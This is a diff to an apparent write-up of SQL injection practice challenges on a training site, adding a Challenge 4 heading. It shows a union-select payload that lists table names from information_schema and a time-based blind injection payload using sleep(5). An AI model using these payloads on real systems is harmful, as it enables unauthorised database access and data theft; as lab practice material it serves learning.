@@ -68,8 +68,15 @@ id=1' order by 1 --+anakein
 
 ## Basic Injection
 
+#### Challenge 1
 ```
 http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=null' union select 66,(select table_name from information_schema.tables where table_schema=database() limit 2,1),66--+anakein
 ```
 
 ![list_table1](https://raw.githubusercontent.com/e-anakein/leettime/master/images/photo_2019-05-24_22-51-48.jpg)
+
+#### Challenge 4
+
+```
+http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=1') and sleep(5) --+anakein
+```
